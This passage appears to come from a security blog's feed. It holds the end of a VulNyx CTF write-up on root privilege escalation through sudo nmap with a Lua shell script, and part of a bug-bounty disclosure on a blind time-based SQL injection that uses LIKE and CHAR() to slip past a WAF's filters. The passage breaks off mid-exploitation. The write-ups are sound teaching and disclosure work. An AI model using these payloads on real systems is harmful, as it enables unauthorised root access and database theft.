Compiled with: liblua-5.3.6 openssl-3.0.11 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 libpcap-1.10.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we can see that the installed nmap is in version 7.93, so interactive mode is not available. This means that the second method is not applicable in this case.&lt;/p&gt;

&lt;p&gt;On the other hand, the first method is based on nmap functionality to execute scripts written in Lua. So executing that commands we get the following result&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;TF=$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                                                                                                
&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;os.execute(&quot;/bin/sh&quot;)&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;                                                                                                                                                                      
&lt;span class=&quot;gp&quot;&gt;echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;                                                                                                                                                                                                          
&lt;span class=&quot;gp&quot;&gt;hacker@HackingStation:/home/hacker$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;                                                                                                                                                                                  
&lt;span class=&quot;gp&quot;&gt;sudo nmap --script=$&lt;/span&gt;TF                                                                                                                                                                                                                      
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-31 01:54 CET                                                                                                                                                                             
NSE: Warning: Loading &apos;/tmp/tmp.YUNY6mz4mx&apos; -- the recommended file extension is &apos;.nse&apos;.                                                                                                                                                    
whoami
root
cd /root
ls
root.txt
snap
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that we got a shell with the &lt;em&gt;root&lt;/em&gt; user and that the root flag is in &lt;em&gt;/root/root.txt&lt;/em&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-3-3&quot; /&gt;

&lt;h2 id=&quot;33-why-does-this-privilege-escalation-via-nmap-exist&quot;&gt;3.3. Why does this privilege escalation via nmap exist?&lt;/h2&gt;

&lt;p&gt;The function &lt;em&gt;os.execute&lt;/em&gt; in Lua allows the execution of operating system commands, so the following Lua code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;os.execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;is essentially a shell. &lt;strong&gt;When this Lua code is executed through nmap, a shell will be invoked with the same user that executed nmap&lt;/strong&gt;. In this case, if nmap is executed without sudo, we get a shell with the &lt;em&gt;hacker&lt;/em&gt; user, but if we execute nmap with sudo, we get a shell with the &lt;em&gt;root&lt;/em&gt; user.&lt;/p&gt;

&lt;p&gt;We can see this in the following root processes with PIDs from 1137 to 1140&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/root-pids.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where 1140 is the PID of the current root shell.&lt;/p&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="ctf" /><category term="vulnyx" /><category term="nmap" /><category term="web" /><category term="command injection" /><category term="gtfobins" /><category term="binary exploitation" /><summary type="html">Writeup of the machine HackingStation from VulNyx.</summary></entry><entry><title type="html">Human 1 - sqlmap 0: defeating automation through manual exploitation</title><link href="https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation/" rel="alternate" type="text/html" title="Human 1 - sqlmap 0: defeating automation through manual exploitation" /><published>2024-03-19T00:00:00+01:00</published><updated>2024-03-19T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-1&quot;&gt;3.1.1. Bypassing the sanitization of the symbol =&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-2&quot;&gt;3.1.2. Bypassing the sanitization of quotes&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-3&quot;&gt;3.1.3. Bypassing the blacklisting of the SUBSTR function&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-4&quot;&gt;3.1.4. Weaponizing the payload to dump the database name&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I will show the trickiest SQL injection I have ever exploited. Moreover, I have the pleasure to share this report with my friend &lt;strong&gt;&lt;a href=&quot;https://es.linkedin.com/in/bernardo-viqueira-hierro-0b882637&quot;&gt;Bernardo Viqueira Hierro&lt;/a&gt;, aka. IckoGZ&lt;/strong&gt;, who discovered the asset and the vulnerability. However, this was not enough and the company told him that he had to demonstrate an impact to win the bounty, so he had to retrieve some data from the BBDD to prove the severity of the SQL injection. Some tools like sqlmap were able to detect the vulnerability but not to exploit it, so Icko contacted me to see if I could do something, so I performed the exploitation.&lt;/p&gt;

&lt;p&gt;I hope you enjoy and learn a lot from this post!&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;Icko discovered the asset through google dorking using the following tool&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://0iq.me/gip/&quot;&gt;IP Google Dorking tool&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;developed by &lt;a href=&quot;https://twitter.com/0x21SAFE&quot;&gt;0x21SAFE&lt;/a&gt;. This tool is used &lt;a href=&quot;https://twitter.com/intigriti/status/1527977514341048320?lang=en&quot;&gt;to find hidden assets by searching only IPs&lt;/a&gt; and can be useful during horizontal recon. This means that during the domain enumeration (domain1.com, domain2.es, domain3.us, …), it may also be interesting to enumerate IPs that do not have an associated domain or subdomain but belong to the company.&lt;/p&gt;

&lt;p&gt;Allowing the web to open multiple tabs so that the tool can work properly and searching for one of the terms suggested by the tool&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Facebook internal assets report
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/asset-discovery-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;yields the following result&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/asset-discovery-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The tool generates several searches in different tabs using Google Dorking. The tab you see in the above capture corresponds to the following Google Dork&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(Facebook internal assets report) (site:*.*.60.* |site:*.*.59.* |site:*.*.58.* |site:*.*.57.* |site:*.*.56.* |site:*.*.55.* |site:*.*.54.* |site:*.*.53.* |site:*.*.52.* |site:*.*.51.* |site:*.*.50.* |site:*.*.49.* |site:*.*.48.* |site:*.*.47.* |site:*.*.46.* |site:*.*.45.* |site:*.*.44.* |site:*.*.43.* |site:*.*.42.* |site:*.*.41.* |site:*.*.40.* |site:*.*.39.* |site:*.*.38.* |site:*.*.37.* |site:*.*.36.* |site:*.*.35.* |site:*.*.34.* |site:*.*.33.* |site:*.*.32.* |site:*.*.31.* |site:*.*.30.* |site:*.*.29.* |site:*.*.28.* |site:*.*.27.* |site:*.*.26.* |site:*.*.25.* |site:*.*.24.* |site:*.*.23.* |site:*.*.22.* |site:*.*.21.* |site:*.*.20.* |site:*.*.19.* |site:*.*.18.* |site:*.*.17.* |site:*.*.16.* |site:*.*.15.* |site:*.*.14.* |site:*.*.13.* |site:*.*.12.* |site:*.*.11.* |site:*.*.10.* |site:*.*.9.* |site:*.*.8.* |site:*.*.7.* |site:*.*.6.* |site:*.*.5.* |site:*.*.4.* |site:*.*.3.* |site:*.*.2.* |site:*.*.1.* |site:*.*.0.* )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This particular dork is used to search for all IPs of the form &lt;em&gt;X.X.[0-60].X&lt;/em&gt; in which the term &lt;em&gt;Facebook internal assets report&lt;/em&gt; appears. This is a partial result but joining the results of all the tabs we have the total result.&lt;/p&gt;

&lt;p&gt;This tool can be useful to perform searches on terms that are very specific to the company, such as a footer. If you take the footer of a website that you know 100% that it belongs to the company and you search for it using this tool, it is likely that you will find other websites with the same footer and therefore belonging to the same company. Original recon method!&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;As I said before, the asset was an IP with no associated domain. Icko found an IP that had several routes with different PHPs, one of them took a number as a parameter but he discovered that there was a WAF so all the tests he did were manual. He sent in that param the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and it triggered a delay of almost 5 seconds, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/vulnerability-discovery.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;During the tests I did, an input of 2 seconds in the sleep triggers a delay between 4 and 5 seconds. The variable time between 4 and 5 seconds is the response time so we could say that the real multiplier is approximately 2, that means, an input of 2 seconds in the sleep triggers a delay of 4 seconds in the response. This happens quite often in blind SQL injections but with different multipliers.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;p&gt;The company told Icko that finding a SQLi was not enough and that he had to exploit it to win the bounty. However, tools like sqlmap were not able to return any information and the exploitation of the SQLi did not seem obvious. Now is when I enter the game :sunglasses:.&lt;/p&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;Since we already got a delay and the response always had the same size and content, I thought the smartest way to extract information was &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays&quot;&gt;triggering time delays&lt;/a&gt;. This way of exploiting SQLi is difficult but I have always found it useful to extract some information from the BBDD and demonstrate that the SQLi is weaponizable. Besides, it is usually quite funny :smiley:.&lt;/p&gt;

&lt;p&gt;If sqlmap is not able to retrieve any information from the database, it is because there are problems: sanitizations, keyword blacklisting… That is why the strategy to follow is to build the payload step by step making sure that all the characters, expressions, functions… are evaluated correctly by the backend.&lt;/p&gt;

&lt;p&gt;The best way to do this is to evaluate boolean expressions that we know to be true and proceed as follows:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;If a delay is triggered, it means that all the characters of the expression are accepted by the backend.&lt;/li&gt;
  &lt;li&gt;If a delay is not triggered, it means that some of the characters of the expression are sanitized or rejected by the backend.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To follow this strategy, the first thing to do is to build a request that evaluates a conditional statement. By sending the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;it returns the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-conditional.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The conditional statement is working because it evaluates &lt;em&gt;1 &amp;lt; 1000&lt;/em&gt; as true and therefore triggers the delay.&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-1&quot; /&gt;

&lt;h3 id=&quot;311-bypassing-the-sanitization-of-the-symbol-&quot;&gt;3.1.1. Bypassing the sanitization of the symbol =&lt;/h3&gt;

&lt;p&gt;The ultimate goal is to compare characters so it will be necessary to use a comparison operator such as &lt;em&gt;=&lt;/em&gt;. Therefore, using a payload as follows&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should trigger a delay. However the response I got was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-equal-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where there was no delay.&lt;/p&gt;

&lt;p&gt;All elements of the payload except the symbol &lt;em&gt;=&lt;/em&gt; have been tested successfully so the only reason for not triggering the delay must be a problem with the symbol &lt;em&gt;=&lt;/em&gt;, for example a sanitization. So… is there another way to check if two numbers or characters are the same? Yes, using the operator &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/mysql/mysql_like.asp&quot;&gt;LIKE&lt;/a&gt;&lt;/em&gt;. Thus, using the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the delay is triggered&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-equal-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-2&quot; /&gt;

&lt;h3 id=&quot;312-bypassing-the-sanitization-of-quotes&quot;&gt;3.1.2. Bypassing the sanitization of quotes&lt;/h3&gt;

&lt;p&gt;Ok, now we can check if 2 numbers are the same, but what we will want to compare in most situations are characters, so the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should trigger a delay. However there was no delay, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-quote-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Again, the problem must be the new element that we have introduced in the payload, which are the single quotes (the same happens with the double quotes). How can we compare characters if we cannot use single or double quotes?&lt;/p&gt;

&lt;p&gt;As we have seen, we can work with numbers and with functions, so it would be good to use a function that given a number returns a character. This way we could work with characters without having to declare them explicitly. What do you know that relates numbers and characters? In effect, the &lt;em&gt;ASCII&lt;/em&gt; code.&lt;/p&gt;

&lt;p&gt;In MySQL the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_sqlserver_char.asp&quot;&gt;CHAR&lt;/a&gt;&lt;/em&gt; function returns the character associated to the &lt;em&gt;ASCII&lt;/em&gt; code given as a parameter. For example, the character &lt;em&gt;a&lt;/em&gt; has &lt;em&gt;ASCII&lt;/em&gt; code 97, so the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should cause a delay, and the response was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-quote-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, a delay is triggered, so the &lt;em&gt;CHAR&lt;/em&gt; function was executed successfully.&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/mathematics.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-3&quot; /&gt;

&lt;h3 id=&quot;313-bypassing-the-blacklisting-of-the-substr-function&quot;&gt;3.1.3. Bypassing the blacklisting of the SUBSTR function&lt;/h3&gt;

&lt;p&gt;To extract information from a BBDD exploiting a SQLi, the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_substr.asp&quot;&gt;SUBSTR&lt;/a&gt;&lt;/em&gt; function is usually used to guess by brute force the value of each string, character by character. Therefore it is necessary to verify that this function works correctly.&lt;/p&gt;

&lt;p&gt;To test this function it is necessary to use a string as input, but as I said before, we cannot declare strings. For this reason I tried to use the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_version.asp&quot;&gt;VERSION&lt;/a&gt;&lt;/em&gt; function, that during the tests I verified that it worked correctly. This function returns the version of the MySQL installed and can be useful to check that the &lt;em&gt;SUBSTR&lt;/em&gt; function works correctly. However the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

